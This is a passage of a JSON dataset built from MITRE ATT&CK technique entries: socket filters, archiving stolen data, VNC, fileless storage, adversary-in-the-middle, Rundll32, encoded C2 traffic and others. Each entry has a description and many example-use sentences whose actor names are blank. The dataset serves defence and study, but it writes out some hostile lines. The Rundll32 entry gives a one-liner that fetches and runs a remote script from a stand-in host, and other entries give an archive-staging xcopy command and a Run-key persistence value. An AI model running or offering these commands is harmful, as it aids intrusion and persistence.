      "installs a `TCP` and `UDP` filter on the `eth0` interface.",
      "uses BPF bytecode to attach a filter to a network socket to view ICMP UDP or TCP packets coming through ports 22 (ssh) 80 (http) and 443 (https). When  finds a packet containing its magic bytes it parses out two fields and forks itself. The parent process continues to monitor filtered traffic while the child process executes the instructions from the parsed fields."
    ],
    "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
    "similar_words": [
      "Socket Filters"
    ],
    "id": "T1205.002"
  },
  "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662": {
    "name": "Archive via Utility",
    "example_uses": [
      "has used the WinRAR utility to compress and encrypt stolen files.",
      "was seen using a RAR archiver tool to compress/decompress data.",
      "has used 7-Zip and WinRAR to compress stolen files for exfiltration.",
      "may be used to Base64 encode collected data.",
      "During  the threat actors used the Makecab utility to compress and a version of WinRAR to create password-protected archives of stolen data prior to exfiltration.",
      "has compressed files before exfiltration using TAR and RAR.",
      "has archived data into ZIP files on compromised machines.",
      "has used WinRAR to compress data prior to exfil.",
      "has used `xcopy \\\\<target_host>\\c$\\users\\public\\path.7z c:\\users\\public\\bin\\<target_host>.7z /H /Y` to archive collected files.",
      "has used 7-Zip to archive data.",
      "uses ZPP a .NET console program to compress files with ZIP.",
      "has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip.",
      "uses WinRAR to compress data that is intended to be exfiltrated.",
      "has used RAR to compress files before moving them outside of the victim network.",
      "has used RAR to create password-protected archives of collected documents prior to exfiltration.",
      "has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts.",
      "can compress files via RAR while staging data to be exfiltrated.",
      "has used WinZip likely to archive data prior to exfiltration.",
      "hides collected data in password-protected .rar archives.",
      "has used WinRAR and 7-Zip to compress an archive stolen data.",
      "contains a module for compressing data using ZIP.",
      "During  threat actors archived collected files with WinRAR prior to exfiltration.",
      "has used the JAR/ZIP file format for exfiltrated files.",
      "has Gzipped information and saved it to a random temp file before exfil.",
      "can compress and archive collected files using WinRAR.",
      "During  the threat actors used 7zr.exe to add collected files to an archive.",
      "can use WinRAR to create a password-protected archive for files of interest.",
      "used WinRAR to compress and encrypt stolen data prior to exfiltration.",
      "created a RAR archive of targeted files for exfiltration.",
      "can encrypt and compress files using Gzip prior to exfiltration.",
      "has used the native Windows cabinet creation tool makecab.exe likely to compress stolen data to be uploaded.",
      "has used a variety of utilities including WinRAR to archive collected data with password protection.",
      "will zip up the /Library/Keychains directory before exfiltrating it.",
      "has the ability to use the macOS built-in zip utility to archive files.",
      "During  the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1 2021.",
      "has encrypted files stolen from connected USB drives into a RAR file before exfiltration.",
      "has created password-protected RAR WinImage and zip archives to be exfiltrated.",
      "extracted documents and bundled them into a RAR archive.",
      "creates a RAR archive based on collected files on the victim's machine.",
      "During  the threat actors uses zip to pack collected files before exfiltration.",
      "has compressed data into password-protected RAR archives prior to exfiltration.",
      "During  threat actors saved collected data to a tar archive.",
      "has compressed data before exfiltrating it using a tool called Abbrevia.",
      "has used QuickZip to archive stolen files before exfiltration.",
      "has used tools to compress data before exfilling it.",
      "compresses collected files with GZipStream before sending them to its C2 server.",
      "has used RAR to compress collected data before exfiltration.",
      "is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration.",
      "uses the zip -r command to compress the data collected on the local system.",
      "has compressed the dump output of compromised credentials with a 7zip binary.",
      "has used WinRAR to compress stolen files into an archive prior to exfiltration.",
      "can compress data with Zip before sending it over C2.",
      "can compress files using `gzip` prior to exfiltration.",
      "has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders.",
      "has used 7Zip to compress .txt .pdf .xls or .doc files prior to exfiltration.",
      "can zip and encrypt data collected on a target system.",
      "has used WinRAR to compress memory dumps prior to exfiltration.",
      "During the   used 7-Zip to compress stolen emails into password-protected archives prior to exfltration;  also compressed text files into zipped archives.",
      "has the ability to compress files with zip.",
      "uses utilities such as WinRAR to archive data prior to exfiltration.",
      "During   archived victim's data into a RAR file.",
      "has leveraged xcopy 7zip and RAR to stage and compress collected documents prior to exfiltration.",
      "has used WinRAR to compress files prior to exfiltration.",
      "can create a ZIP archive with specified files and directories.",
      "has downloaded 7-Zip to decompress password protected archives.",
      "used 7zip to archive extracted data in preparation for exfiltration.",
      "created a RAR archive of targeted files for exfiltration. Additionally  used the makecab.exe utility to both download tools such as NATBypass to the victim network and to archive a file for exfiltration.",
      "used `rar` to compress data downloaded from internal Oracle databases prior to exfiltration.",
      "has used several publicly available tools including WinRAR and 7zip to compress collected files and memory dumps prior to exfiltration.",
      "has used 7-Zip and WinRAR to archive collected data prior to exfiltration.",
      "During   used built-in PowerShell capabilities (Compress-Archive cmdlet) to compress collected data.",
      "used the tar utility to create a local archive of email data on a victim system.",
      "can gzip compress files uploaded to a shared mailbox used for C2 and exfiltration.",
      "has used WinRAR for compressing data in RAR format.",
      "has archived collected materials in RAR format."
    ],
    "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as tar on Linux and macOS or zip on Windows systems. On Windows, diantz or  makecab may be used to package collected files into a cabinet (.cab) file. diantz may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) xcopy on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
    "similar_words": [
      "Archive via Utility"
    ],
    "id": "T1560.001"
  },
  "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b": {
    "name": "VNC",
    "example_uses": [
      "supports functionality for VNC sessions.",
      "has used VNC tools including UltraVNC to remotely interact with compromised hosts.",
      "has used TightVNC to control compromised hosts.",
      "can use VNC for remote access to targeted systems.",
      "can start a remote VNC session by downloading a new plugin.",
      "uses VNC for lateral movement.",
      "has installed TightVNC server and client on compromised servers and endpoints for lateral movement.",
      "has used a VNC module to monitor the victim and collect information to pivot to valuable systems on the network",
      "uses VNC to connect into systems.",
      "has the ability of performing remote desktop access via a VNC console.",
      "has routed C2 traffic using Keyhole VNC."
    ],
    "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (remote framebuffer) protocol to enable users to remotely control another computers display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
    "similar_words": [
      "VNC"
    ],
    "id": "T1021.005"
  },
  "attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939": {
    "name": "Fileless Storage",
    "example_uses": [
      "can store configuration strings keylogger and output of components in the Registry.",
      "can store encrypted JSON configuration files in the Registry.",
      "can store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft.",
      "can install and store encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.",
      "has stored encrypted orchestrator code and payloads in the Registry.",
      "maintains a configuration block and virtual file system in the Registry.",
      "can store its components in the Registry.",
      "can store configuration information for the kernel driver and kernel driver loader components in an encrypted blob typically found at `HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds.`",
      "can store its encoded configuration file within Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.",
      "stores the backdoor's configuration in the Registry in XML format.",
      "can store its configuration in the Registry at `HKCU\\Software\\` under frequently changing names including %USERNAME% and ToolTech-RM.",
      "can store its configuration information in the Registry under `HKCU:\\Software\\Netwire`.",
      "has stored a compressed payload in the Registry key HKLM\\SOFTWARE\\Microsoft\\DRM.",
      "can save its configuration parameters in the Registry.",
      "may store RC4 encrypted configuration information in the Windows Registry.",
      "backdoor has stored its configuration in a registry key.",
      "stores a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications within a Registry key (such as `HKCU\\Office365DCOMCheck`) in the `HKCU` hive.",
      "can store its encryption key in the Registry.",
      "can save its configuration data as a RC4-encrypted Registry key under `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon`.",
      "During  the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs.",
      "has the ability to store information regarding the C2 server and downloads in the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64.",
      "stores an encoded configuration file in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.",
      "Some versions of  stored its instructions (otherwise in a `instructions.ini` file) in the Registry.",
      "has used the Registry to store encrypted and encoded payloads.",
      "can store its obfuscated configuration file in the Registry under `HKLM\\SOFTWARE\\Plus` or `HKCU\\SOFTWARE\\Plus`.",
      "has installed a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot registry key.",
      "has stored its encrypted payload in the Registry under `HKLM\\SOFTWARE\\Microsoft\\Print\\Components\\`.",
      "can save encryption parameters and system information in the Registry.",
      "stores configuration values under the Registry key HKCU\\Software\\Microsoft\\[dllname].",
      "Some versions of  build the final PE payload in memory to avoid writing contents to disk on the executing machine."
    ],
    "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock` may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation: Aquasec Muhstik Malware 2024)Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) ",
    "similar_words": [
      "Fileless Storage"
    ],
    "id": "T1027.011"
  },
  "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d": {
    "name": "Adversary-in-the-Middle",
    "example_uses": [
      "proxies web traffic to potentially monitor and alter victim HTTP(S) traffic.",
      "has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.",
      "opens a new network listener for the mpnotify.exe process that is typically contacted by the Winlogon process in Windows. A new alternative RPC channel is set up with a malicious DLL recording plaintext credentials entered into Winlogon effectively intercepting and redirecting the logon information.",
      "included interception of HTTP traffic to victim devices to identify and parse command and control information sent to the device.",
      "intercepts HTTP requests to the victim Cisco ASA looking for a request with a 32-character victim dependent parameter. If that parameter matches a value in the malware a contained payload is then written to a Lua script and executed.",
      "modified DNS records at service providers to redirect traffic from legitimate resources to -controlled servers to enable adversary-in-the-middle attacks for credential capture."
    ],
    "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
    "similar_words": [
      "Adversary-in-the-Middle"
    ],
    "id": "T1557"
  },
  "attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2": {
    "name": "Acquire Infrastructure",
    "example_uses": [
      "used various third-party email campaign management services to deliver phishing emails.",
      "has used funds from stolen and laundered cryptocurrency to acquire operational infrastructure.",
      "uses services such as IVPN SurfShark and Tor to add anonymization to operations.",
      "has purchased access to victim VPNs to facilitate access to victim environments.",
      "typically uses commercial VPN services for anonymizing last-hop traffic to victim networks such as ProtonVPN.",
      "has used HubSpot and MailerLite marketing platform services to hide the true sender of phishing emails.",
      "accessed victim networks from VPN service provider networks."
    ],
    "description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
    "similar_words": [
      "Acquire Infrastructure"
    ],
    "id": "T1583"
  },
  "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5": {
    "name": "Rundll32",
    "example_uses": [
      "During   executed malware with `C:\\\\windows\\system32\\rundll32.exe C:\\ProgramData\\ThumbNail\\thumbnail.db` `CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905`.",
      "has used rundll32.exe for execution.",
      "During  the threat actors used `rundll32.exe` to execute the  Beacon loader DLL.",
      "can load a DLL using Rundll32.",
      "can use RunDLL32 for execution.",
      "has used rundll32.exe in a Registry value to establish persistence.",
      "uses rundll32 within  entries to execute malicious DLLs.",
      "has used rundll32.exe to load a DLL for file encryption.",
      "has used `rundll32.exe` for execution.",
      "uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).",
      "uses rundll32 to call an exported function.",
      "Variants of  have used rundll32.exe in Registry values added to establish persistence.",
      "uses rundll32.exe to load.",
      "launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.",
      "uses rundll32.exe to load its DLL.",
      "has used rundll32 during execution.",
      "malware has used rundll32 to launch additional malicious components.",
      "can be executed using rundll32.exe.",
      "After copying itself to a DLL file a variant of  calls the DLL file using rundll32.exe.",
      "has used `rundll32.exe` to execute malware on a compromised network.",
      "configured its payload to inject into the rundll32.exe.",
      "installer plugin can schedule rundll32.exe to load the dispatcher.",
      "can use `rundll32` for execution of its components.",
      "has used `rundll32.exe` to execute malicious scripts and malware on a victim's network.",
      "has the ability to proxy execution of malicious files with Rundll32.",
      "can use rundll32 for execution on compromised hosts.",
      "During  the threat actors loaded DLLs via `rundll32` using the `svchost` process.",
      "installs VNC server software that executes through rundll32.",
      "has a tool that can run DLLs.",
      "has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.",
      "has used rundll32.exe to load malicious DLLs.",
      "uses RunDLL32 for execution via its injector DLL.",
      "uses Rundll32 to ensure only a single instance of itself is running at once.",
      "A  variant has used rundll32 for execution.",
      "has used rundll32.exe to execute DLLs.",
      "has executed custom-compiled XMRIG miner DLLs using rundll32.exe.",
      "has utilized `rundll32.exe` to deploy ransomware commands with the use of WebDAV.",
      "The  installer loads a DLL using rundll32.",
      "The  dropper copies the system file rundll32.exe to the install location for the malware then uses the copy of rundll32.exe to load and execute the main  component.",
      "can use `rundll32.exe` for execution of living off the land binaries (lolbin) such as `SHELL32.DLL`.",
      "malware has used rundll32.exe to execute an initial infection process.",
      "can use rundll32.exe to gain execution.",
      "can use `rundll32.exe` for execution.",
      "used Rundll32 to execute payloads.",
      "has used `rundll32` for execution of the loader component.",
      "has used rundll32 to execute malicious payloads on a compromised host.",
      "has leveraged rundll32.exe to execute malicious DLLs.",
      "has used rundll32 to launch a malicious DLL as C:Windowsinfpub.dat.",
      "has used `rundll32.exe` for execution.",
      "uses rundll32 to load various tools on victims including a lateral movement tool named Vminst Cobalt Strike and shellcode.",
      "has used rundll32.exe to execute a loader.",
      "has used `rundll32` for execution.",
      "loader components can be executed through rundll32.exe.",
      "During the   used `Rundll32.exe` to execute payloads.",
      "used a backdoor which could execute a supplied DLL using rundll32.exe.",
      "executed  by using rundll32 commands such as rundll32.exe C:\\Windows\\twain_64.dll.  also executed a .dll for a first stage dropper using rundll32.exe. An  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.",
      "has used rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\vert = rundll32.exe c:\\windows\\temp\\pvcu.dll Qszdez.",
      "has used rundll32 to load malicious DLLs.",
      "can execute rundll32.exe in memory to avoid detection.",
      "executes functions using rundll32.exe.",
      "During the   used a backdoor which could execute a supplied DLL using `rundll32.exe`.",
      "has used rundll32 to execute a malicious DLL.",
      "calls cmd.exe to run various DLL files via rundll32.",
      "has used rundll32.exe to execute other DLLs and named pipes.",
      "contains a module for downloading and executing DLLs that leverages rundll32.exe.",
      "has used rundll32 for execution.",
      "can execute via rundll32.",
      "runs its core DLL file using rundll32.exe.",
      "uses rundll32.exe in a Registry value added to establish persistence.",
      "has used Rundll32 to execute its loader for privilege escalation purposes.",
      "uses Rundll32 for executing the dropper program.",
      "During  the threat actors used `rundll32.exe` to execute malicious installers.",
      "has executed downloaded DLLs with rundll32.exe.",
      "uses Rundll32 to load a malicious DLL.",
      "can execute commands and scripts through rundll32.",
      "has used rundll32.exe to execute binaries scripts and Control Panel Item files and to execute code via proxy to avoid triggering security tools.",
      "has used Rundll32 to load a malicious DLL.",
      "is installed via execution of rundll32 with an export named init or InitW.",
      "uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.",
      "Rundll32.exe is used as a way of executing  at the command-line.",
      "has used `rundll32.exe` to execute  stagers.",
      "uses rundll32.exe to install itself on remote systems when accessed via  or wmic.",
      "can use `rundll32.exe` to load DLL from the command line.",
      "is executed using rundll32.exe.",
      "has the ability to create a new process using `rundll32`.",
      "has used rundll32.exe to execute components of VirtualBox.",
      "has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.",
      "has used Rundll32.exe to drop malicious DLLs including  and to enable C2 communication.",
      "has been executed using `rundll32.exe`.",
      "can use Rundll32 to execute additional payloads.",
      "During  the threat actors used `rundll32` to run .",
      "can use rundll32.exe to execute downloaded DLLs.",
      "has used rundll32.exe to execute the  loader.",
      "uses rundll32 execution without any command line parameters to contact command and control infrastructure such as IP addresses associated with  nodes.",
      "proxied execution of malicious DLLs through a renamed rundll32.exe binary.",
      "has used rundll32.exe to execute malicious files.",
      "used rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary.",
      "utilizes rundll32.exe to execute the final  payload using the named exports `Crash` or `Limit` depending on the variant.",
      "is a Windows DLL file executed via ordinal by `rundll32.exe`.",
      "DLL payloads have been executed via `rundll32.exe`.",
      "is dropped as a DLL file and executed via `rundll32.exe` by its installer."
    ],
    "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
    "similar_words": [
      "Rundll32"
    ],
    "id": "T1218.011"
  },
  "attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336": {
    "name": "Container and Resource Discovery",
    "example_uses": [
      "can enumerate Kubernetes pods in a given namespace.",
      "has checked for running containers with docker ps and for specific container names with docker inspect.  has also searched for Kubernetes pods running in a local network.",
      "has used masscan to search for kubelets and the kubelet API for additional running containers."
    ],
    "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environments configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversarys next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ",
    "similar_words": [
      "Container and Resource Discovery"
    ],
    "id": "T1613"
  },
  "attack-pattern--04a5a8ab-3bc8-4c83-95c9-55274a89786d": {
    "name": "Serverless",
    "example_uses": [
      "used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control."
    ],
    "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
    "similar_words": [
      "Serverless"
    ],
    "id": "T1583.007"
  },
  "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c": {
    "name": "Standard Encoding",
    "example_uses": [
      "has used Base64 for encoded C2 traffic.",
      "can use Base64 to encode its C2 traffic.",
      "can Base64 encode data sent to C2.",
      "C2 traffic from  is encrypted then encoded with Base64 encoding.",
      "has encoded bidirectional data communications between a target system and C2 server using Base64.",
      "transforms encrypted binary data into an ASCII string in order to use it as a URL parameter value.",
      "C2 traffic is base64-encoded.",
      "BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.",
      "has used Base64 to encode its C2 traffic.",
      "has used Base64 to encode C2 communications.",
      "can Base32 encode chunks of output files during exfiltration.",
      "has the ability to base64 encode C2 communications.",
      "used Base64 to encode C2 traffic.",
      "has encoded C2 communications with Base64.",
      "A  variant encodes C2 POST data base64.",
      "used Base64 encoding in its C2 traffic.",
      "can encode data using Base64 prior to exfiltration.",
      "has encoded its C2 traffic with Base64.",
      "can base64 encode all incoming and outgoing C2 messages.",
      "C2 messages are Base64-encoded.",
      "encodes C2 communications with base64.",
      "encodes data using Base64 before sending it to the C2 server.",
      "can encode C2 data with a custom technique that utilizes Base64.",
      "uses ZLIB Compression to compresses data sent to the C2 server in the `payload` section network communication packet.",
      "has encoded its C2 traffic with Base64.",
      "has used Googles Protobufs to serialize data sent to and from the C2 server.",
      "has encoded C2 communications in Base64.",
      "uses custom base64 encoding to obfuscate HTTP traffic.",
      "can communicate with the C2 via base32-encoded subdomains.",
      "Responses from the  C2 server are base32-encoded.",
      "can base64 encode C2 replies.",
      "can transmit URL encoded data over C2.",
      "Several  tools encode data with base64 when posting it to a C2 server.",
      "has encoded communications with the C2 server with base64.",
      "has the ability to use base16 encoded strings in C2.",
      "encodes the data sent to the server in Base64.",
      "encodes data in hexadecimal format over the C2 channel.",
      "encodes communications to the C2 server in Base64.",
      "has used base64 encoding.",
      "can encode C2 traffic with Base64.",
      "has used encoded ASCII text for initial C2 communications.",
      "uses Base64 to encode information sent to the C2 server.",
      "has used `zlib` to compress all data after 0x52 for the custom TCP C2 protocol.",
      "encoded C2 traffic with base64.",
      "Some  samples use standard Base64 + bzip2 and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.",
      "has utilized Zlib compression to obfuscate the communications payload.",
      "has used base64 to encode C2 communication.",
      "has encoded its communications to C2 servers using Base64.",
      "encodes C2 traffic with base64.",
      "has the ability to base64 encode C2 server responses.",
      "uses Base64 encoding for C2 traffic.",
      "can Base64-encode C2 commands.",
      "uses Base64 encoding for C2 traffic.",
      "has sent a C2 response that was base64-encoded.",
      "uses Base64 encoding for C2 traffic.",
      "A  malware sample encodes data with base64.",
      "encodes data using hexadecimal representation before sending it to the C2 server.",
      "encodes C2 traffic with base64.",
      "base64 encodes strings that are sent to the C2 over its DNS tunnel.",
      "has used Base64 encoding to uniquely identify communication to and from the C2.",
      "can base-64 encode encrypted data sent through C2.",
      "has exfiltrated data via hexadecimal-encoded subdomain fields of DNS queries.",
      "has used base64 encoding to hide command strings delivered from the C2.",
      "has encoded data using  before exfiltration.",
      "uses custom Base64 encoding schemes to obfuscate command and control traffic in the message body of HTTP requests.",
      "can use Base64 to encode its C2 traffic.",
      "has the ability to encode C2 communications with base64 encoding.",
